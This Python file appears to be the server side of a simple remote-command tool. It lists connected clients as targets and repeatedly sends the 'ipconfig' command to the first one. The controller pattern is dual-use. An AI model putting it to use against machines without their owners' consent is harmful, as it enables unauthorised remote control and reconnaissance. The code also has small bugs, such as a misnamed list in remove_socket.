import socket
import signal #identifie les signaux pour kill le programme
import sys #utilisé pour sortir du programme
import time
import threading
from ClientThread import ClientListener
from Gui import *


class Server():

    def __init__(self, port):
        self.listener= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.bind(('', port))
        self.listener.listen(1)
        print("Listening on port", port)
        self.clients_sockets= []
        self.clients_addresses= []
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def signal_handler(self, signal, frame):
        self.listener.close()
        self.echo("QUIT")

    def run(self):
        while True:
            #print("listening new customers")
            try:
                (client_socket, client_adress) = self.listener.accept()
            except socket.error:
                sys.exit("Cannot connect clients")
            self.clients_sockets.append(client_socket)
            self.clients_addresses.append(client_adress)
            #print("Start the thread for client:", client_adress)
            client_thread= ClientListener(self, client_socket, client_adress)
            client_thread.start()
            time.sleep(0.1)

    def remove_socket(self, socket):
        self.client_sockets.remove(socket)

    def echo(self, data):
        #print("echoing:", data)
        for sock in self.clients_sockets:
            try:
                sock.sendall(data.encode("UTF-8"))
            except socket.error:
                print("Cannot send the message")


if __name__ == "__main__":
    server= Server(59001)
    # gui = Gui(['015b3or2iqfbnq', 'usia020u2cmbip', 'u5uvsb4epvbr4c', 'xjclld13j091ly', '9il7a640y2o1vb'])
    thread = threading.Thread(target=server.run)
    thread.daemon = True
    thread.start()
    message= ""
    while message!="QUIT":
        if(len(server.clients_addresses)>0):
            print("list of client :")
            for i in range(len(server.clients_addresses)):
                print(i, server.clients_addresses[i])
                
            # gui.setTargetList(server.clients_addresses)
            gui = Gui(server.clients_addresses)
            try:
                #idSelected= int(input("select client:"))
                #idSelected = gui.on_select()
                idSelected = 0
            except ValueError:
                print("Value Error, selected device 0")
            # message= input("Enter message:")
            message= "ipconfig"
            if(message!="QUIT"):
                server.clients_sockets[idSelected].sendall(message.encode("UTF-8"))
                time.sleep(2)




